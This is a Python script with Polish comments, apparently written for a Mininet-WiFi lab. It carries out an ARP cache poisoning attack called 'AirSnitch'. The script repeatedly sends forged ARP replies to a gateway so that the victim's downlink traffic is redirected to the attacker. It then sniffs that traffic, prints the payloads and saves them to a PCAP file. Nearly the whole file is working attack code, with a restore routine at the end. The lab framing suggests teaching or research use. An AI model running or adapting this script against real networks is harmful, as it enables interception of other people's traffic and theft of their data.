#!/usr/bin/env python3
"""
============================================================
AirSnitch - Przechwytywanie Ruchu (ARP Cache Poisoning)
Zatrucie tablicy ARP bramy w celu przechwycenia downlinku
============================================================

Mechanizm:
    1. Atakujący zatruwa ARP bramy:
       "IP ofiary (192.168.10.2) jest pod MOIM adresem MAC"
    2. Brama aktualizuje tablicę ARP
    3. Cały ruch DOWNLINK (brama -> ofiara) trafia do atakującego!

    Dlaczego to działa mimo izolacji?
    - Atakujący MOŻE komunikować się z bramą (izolacja pozwala)
    - Brama wysyła ruch do MAC atakującego (legalna komunikacja)
    - AP przepuszcza ruch od bramy do klienta

Uruchomienie z Mininet-WiFi CLI:
    atk1 python3 airsnitch_intercept.py

Zatrzymanie: Ctrl+C (automatyczne przywrócenie ARP)
"""

from scapy.all import (
    Ether, ARP, IP, TCP, UDP, ICMP, Raw,
    sendp, sniff, wrpcap, conf
)
import subprocess
import threading
import signal
import time
import sys
import atexit

# ╔══════════════════════════════════════════════════════════╗
# ║                  KONFIGURACJA SIECI                      ║
# ╚══════════════════════════════════════════════════════════╝
GW_IP       = "192.168.10.1"
GW_MAC      = "00:00:00:00:00:FF"
VICTIM_IP   = "192.168.10.2"
VICTIM_MAC  = "00:00:00:00:00:01"
ATK_IP      = "192.168.10.4"
ATK_MAC     = "00:00:00:00:00:66"


def get_wlan_interface():
    result = subprocess.run(
        ['ip', '-o', 'link', 'show'], capture_output=True, text=True
    )
    for line in result.stdout.strip().split('\n'):
        parts = line.split(':')
        if len(parts) >= 2:
            iface = parts[1].strip().split('@')[0]
            if 'wlan' in iface:
                return iface
    return 'atk1-wlan0'


IFACE = get_wlan_interface()
conf.verb = 0
conf.sniff_on_socket = True
PCAP_PATH = '/tmp/airsnitch_intercept.pcap'

# ── Zmienne globalne ──
running = True
captured_packets = []
stats = {'total': 0, 'icmp': 0, 'tcp': 0, 'udp': 0, 'other': 0}
last_flush_count = 0


def flush_pcap():
    """Zapisz przechwycone pakiety do PCAP (wywoływane co 10 pkt i na zakończenie)"""
    global last_flush_count
    if captured_packets and len(captured_packets) > last_flush_count:
        try:
            wrpcap(PCAP_PATH, captured_packets)
            last_flush_count = len(captured_packets)
        except Exception:
            pass


atexit.register(flush_pcap)


def signal_handler(sig, frame):
    global running
    running = False


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


# ╔══════════════════════════════════════════════════════════╗
# ║           FUNKCJE ATAKU                                  ║
# ╚══════════════════════════════════════════════════════════╝

def poison_gateway():
    """
    Cykliczne zatruwanie tablicy ARP bramy sieciowej.
    Wysyła fałszywe odpowiedzi ARP:
        "IP ofiary jest pod MAC adresem atakującego"
    """
    # Pakiet ARP is-at: Informuje bramę, że VICTIM_IP -> ATK_MAC
    poison_pkt = (
        Ether(src=ATK_MAC, dst=GW_MAC) /
        ARP(
            op="is-at",          # ARP Reply
            psrc=VICTIM_IP,      # "Jestem pod tym IP..." (ofiary!)
            hwsrc=ATK_MAC,       # "...a mój MAC to..." (atakującego!)
            pdst=GW_IP,          # Odbiorca: brama
            hwdst=GW_MAC
        )
    )

    print(f"[*] Wątek zatruwania ARP uruchomiony (co 0.1 s)")
    while running:
        sendp(poison_pkt, iface=IFACE)
        time.sleep(0.1)


def restore_arp():
    """Przywrócenie prawidłowej tablicy ARP bramy"""
    print(f"\n[*] Przywracanie prawidłowego ARP na bramie...")
    restore_pkt = (
        Ether(src=VICTIM_MAC, dst=GW_MAC) /
        ARP(
            op="is-at",
            psrc=VICTIM_IP,
            hwsrc=VICTIM_MAC,    # Prawidłowy MAC ofiary
            pdst=GW_IP,
            hwdst=GW_MAC
        )
    )
    for _ in range(5):
        sendp(restore_pkt, iface=IFACE)
        time.sleep(0.3)
    print(f"[+] ARP bramy przywrócony ✓")


def packet_handler(pkt):
    """Analiza przechwyconych pakietów"""
    if not running:
        return

    # Sprawdź czy to pakiet przekierowany od bramy
    # (L2 dst=nasz MAC, ale L3 dst=IP ofiary lub src≠nas)
    if not IP in pkt:
        return

    ip_layer = pkt[IP]

    # Filtruj pakiety, które brama wysłała do NAS
    # zamiast do ofiary (efekt zatrutego ARP)
    if Ether in pkt and pkt[Ether].dst == ATK_MAC:
        # Ignoruj pakiety od nas samych i normalne odpowiedzi dla nas
        if ip_layer.src == ATK_IP:
            return

        stats['total'] += 1
        captured_packets.append(pkt)

        # Okresowy zapis PCAP (co 10 pakietów)
        if stats['total'] % 10 == 0:
            flush_pcap()

        # Klasyfikacja protokołu
        proto = "?"
        detail = ""
        if ICMP in pkt:
            stats['icmp'] += 1
            proto = "ICMP"
            detail = f"type={pkt[ICMP].type} code={pkt[ICMP].code}"
        elif TCP in pkt:
            stats['tcp'] += 1
            proto = "TCP"
            detail = f"port={pkt[TCP].sport}->{pkt[TCP].dport} " \
                     f"flags={pkt[TCP].flags}"
        elif UDP in pkt:
            stats['udp'] += 1
            proto = "UDP"
            detail = f"port={pkt[UDP].sport}->{pkt[UDP].dport}"
        else:
            stats['other'] += 1
            proto = f"Proto({ip_layer.proto})"

        print(f"  [{stats['total']:4d}] PRZECHWYCONO | "
              f"{ip_layer.src:>15s} -> {ip_layer.dst:<15s} | "
              f"{proto:5s} | {detail}")

        # Pokaż dane (payload) jeśli istnieją
        if Raw in pkt:
            try:
                data = pkt[Raw].load
                text = data.decode('utf-8', errors='replace')[:120]
                if text.strip():
                    print(f"         └─ Dane: {text}")
            except Exception:
                pass


# ╔══════════════════════════════════════════════════════════╗
# ║                    GŁÓWNY ATAK                           ║
# ╚══════════════════════════════════════════════════════════╝

def main():
    global running

    print("=" * 60)
    print("  AirSnitch - Przechwytywanie Ruchu (ARP Poisoning)")
    print("=" * 60)

    print(f"\n[*] Konfiguracja:")
    print(f"    Interfejs : {IFACE}")
    print(f"    Brama     : {GW_IP} ({GW_MAC})")
    print(f"    Ofiara    : {VICTIM_IP} ({VICTIM_MAC})")
    print(f"    Atakujący : {ATK_IP} ({ATK_MAC})")

    print(f"\n[*] Schemat ataku:")
    print(f"    PRZED:  Internet ──> Brama ──> [MAC ofiary] ──> sta1 ✓")
    print(f"    PO:     Internet ──> Brama ──> [MAC atakuj.] ──> atk1 !")
    print(f"                                   ↑ Zatruty ARP!")

    # ── Faza 1: Uruchomienie zatruwania ARP ──
    print(f"\n[*] Faza 1: Rozpoczęcie zatruwania ARP bramy...")
    poison_thread = threading.Thread(target=poison_gateway, daemon=True)
    poison_thread.start()
    time.sleep(2)
    print(f"[+] ARP Poisoning aktywne ✓")
    print(f"[+] Brama uważa, że {VICTIM_IP} → {ATK_MAC}")

    # ── Faza 2: Nasłuchiwanie ──
    print(f"\n[*] Faza 2: Przechwytywanie pakietów...")
    print(f"[*] W osobnym terminalu uruchom test:")
    print(f"    sta1 ping -c 5 192.168.10.1")
    print(f"    sta1 curl http://192.168.10.1/")
    print(f"\n[*] Naciśnij Ctrl+C aby zakończyć\n")
    print(f"{'─' * 60}")

    try:
        while running:
            sniff(
                iface=IFACE,
                prn=packet_handler,
                store=0,
                timeout=1,
                stop_filter=lambda p: not running
            )
    except KeyboardInterrupt:
        pass
    finally:
        running = False

        # ── Przywrócenie ARP ──
        restore_arp()

        # ── Podsumowanie ──
        print(f"\n{'=' * 60}")
        print(f"  PODSUMOWANIE PRZECHWYTYWANIA")
        print(f"{'=' * 60}")
        print(f"  Przechwycono łącznie: {stats['total']} pakietów")
        print(f"    ICMP : {stats['icmp']}")
        print(f"    TCP  : {stats['tcp']}")
        print(f"    UDP  : {stats['udp']}")
        print(f"    Inne : {stats['other']}")

        # ── Zapis PCAP (końcowy) ──
        flush_pcap()
        if captured_packets:
            print(f"\n  [+] Zapisano {len(captured_packets)} pakietów: {PCAP_PATH}")
            print(f"  [+] Otwórz w Wiresharku: wireshark {PCAP_PATH}")
        else:
            print(f"\n  [-] Nie przechwycono żadnych pakietów.")
            print(f"  [-] Upewnij się, że sta1 generuje ruch (ping/curl)")

        print(f"{'=' * 60}\n")


if __name__ == '__main__':
    main()
